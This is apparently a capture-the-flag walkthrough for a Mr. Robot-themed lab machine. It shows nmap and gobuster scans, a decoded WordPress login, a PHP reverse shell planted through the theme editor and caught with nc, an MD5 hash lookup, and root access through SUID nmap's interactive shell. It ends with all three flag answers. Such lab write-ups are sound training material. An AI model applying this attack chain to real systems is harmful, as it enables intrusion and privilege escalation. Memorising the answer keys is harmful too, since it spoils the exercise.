# Task 1 Hack the machine :
----

>>Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

## SCANNING :

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV 10.10.114.202

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-27 15:02 GMT
Nmap scan report for ip-10-10-114-202.eu-west-1.compute.internal (10.10.114.202)
Host is up (0.024s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 02:0F:BA:2D:80:29 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.10 seconds

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ gobuster dir -u http://10.10.230.70/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.230.70/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/28 08:58:18 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.10.230.70/0/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.230.70/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.230.70/feed/atom/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.230.70/audio/]  
/blog                 (Status: 301) [Size: 233] [--> http://10.10.230.70/blog/]   
/css                  (Status: 301) [Size: 232] [--> http://10.10.230.70/css/]    
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.230.70/wp-admin/] 
/favicon.ico          (Status: 200) [Size: 0]                                     
/feed                 (Status: 301) [Size: 0] [--> http://10.10.230.70/feed/]     
/images               (Status: 301) [Size: 235] [--> http://10.10.230.70/images/] 
/Image                (Status: 301) [Size: 0] [--> http://10.10.230.70/Image/]    
/image                (Status: 301) [Size: 0] [--> http://10.10.230.70/image/]    
/index.html           (Status: 200) [Size: 1077]                                  
/index.php            (Status: 301) [Size: 0] [--> http://10.10.230.70/]          
/intro                (Status: 200) [Size: 516314]                                
/js                   (Status: 301) [Size: 231] [--> http://10.10.230.70/js/]     
/license              (Status: 200) [Size: 309]                                   
/login                (Status: 302) [Size: 0] [--> http://10.10.230.70/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.230.70/]            
/phpmyadmin           (Status: 403) [Size: 94]                                      
/readme               (Status: 200) [Size: 64]                                      
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.230.70/feed/rdf/]   
/robots               (Status: 200) [Size: 41]                                      
/robots.txt           (Status: 200) [Size: 41]                                      
/rss                  (Status: 301) [Size: 0] [--> http://10.10.230.70/feed/]       
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.230.70/feed/]       
/sitemap              (Status: 200) [Size: 0]                                       
/sitemap.xml          (Status: 200) [Size: 0]                                       
/video                (Status: 301) [Size: 234] [--> http://10.10.230.70/video/]    
/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.230.70/wp-admin/] 
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.230.70/wp-content/]
/wp-config            (Status: 200) [Size: 0]                                        
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.230.70/wp-includes/]
/wp-cron              (Status: 200) [Size: 0]                                         
/wp-links-opml        (Status: 200) [Size: 227]                                       
/wp-load              (Status: 200) [Size: 0]                                         
/wp-login             (Status: 200) [Size: 2606]                                      
/wp-mail              (Status: 500) [Size: 3064]                                      
/wp-settings          (Status: 500) [Size: 0]                                         
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.230.70/wp-login.php?action=register]
/xmlrpc.php           (Status: 405) [Size: 42]                                                      
/xmlrpc               (Status: 405) [Size: 42]                                                      
                                                                                                    
===============================================================
2022/01/28 09:37:26 Finished
===============================================================

```

## FINDING FIRST KEY :

>> While seeing robots.txt we found that there is a subdirectory that has key1 .

```
http://10.10.230.70/key-1-of-3.txt
```
```
key1 - 073403c8a58a1f80d943455fb30724b9
```

>> And there is a another directory that directory has downloadable file which has ton of strings that can be used with hydra to brute the wordpress loginpage.  

```
http://10.10.118.131/fsocity.dic
```

>> There is a directory called license which has a base64 string if we decode it, that is the password for the wordpress webpage. 

```
http://10.10.118.131/license
```

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ echo -n ZWxsaW90OkVSMjgtMDY1Mgo= | base64 -d 
elliot:ER28-0652
```

## GETTING A SHELL :

>> After logging there is appearance panel which has editor column that can accessed by us. 

>> With that editor session section we can upload a reverse shell and get the remote access.

>> I choose archive.php and uploading the php rev-shell.

```
http://10.10.230.70/wp-content/themes/twentyfifteen/archive.php/
```

>> Getting a shell has user.

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nc -lvnp 7007
listening on [any] 7007 ...
connect to [10.9.2.202] from (UNKNOWN) [10.10.230.70] 46149
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 14:26:45 up 37 min,  0 users,  load average: 6.14, 6.11, 5.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
sh: 0: can't access tty; job control turned off
$ 
$ python -c "import pty;pty.spawn('/bin/bash')"
daemon@linux:/$ ^Z
zsh: suspended  nc -lvnp 7007
                                                                                                                            
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ stty raw -echo && fg                                       
[1]  + continued  nc -lvnp 7007
daemon@linux:/$ export TERM=xterm

daemon@linux:/$ cd home/robot/
daemon@linux:/home/robot$ ls
key-2-of-3.txt  password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b

```

>> Go to this url and decode the hash

```
https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b

decoded hash : abcdefghijklmnopqrstuvwxyz
```

>> Then login with user robot.

```bash
daemon@linux:/home/robot$ su robot
Password: 
robot@linux:~$ 
robot@linux:~$ cat key-2-of-3.txt 
822c73956184f694993bede3eb39f959
```

## PRIVILEGE ESCALATION :

>> With this command we can find the suid binary to escalate our privilege as root.

>> Here iam using nmap to escalate our privilege as root. 

```bash
robot@linux:/$ find / -perm +6000 2>/dev/null | grep '/bin'
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper

robot@linux:/$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# 
# cd /
# cd root
# ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

----

# ANSWER THE QUESTIONS :
----

1.What is key 1?
>>073403c8a58a1f80d943455fb30724b9

2.What is key 2?
>>822c73956184f694993bede3eb39f959

3.What is key 3?
>>04787ddef27c3dee1ee161b21670b4e4

----